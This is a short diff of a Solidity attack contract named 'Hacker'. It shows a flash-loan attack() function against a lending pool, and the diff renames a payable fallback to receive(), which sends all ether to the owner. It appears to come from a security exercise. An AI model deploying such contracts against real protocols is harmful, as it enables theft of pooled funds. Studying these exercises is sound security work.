@@ -40,6 +40,7 @@ contract Hacker is Ownable {
 
     function attack() external {
         console.log("FlashLoan called");
+
         balanceOfLendingPool = token.balanceOf(lendingPool);
         ILendingPool(lendingPool).flashLoan(balanceOfLendingPool);
         console.log("FlashLoan repaid");
@@ -59,7 +60,7 @@ contract Hacker is Ownable {
         require(success);
     }
 
-    fallback() external payable {
+    receive() external payable {
         console.log("Money's comming ");
 
         (bool success, ) = owner().call{value: address(this).balance}("");
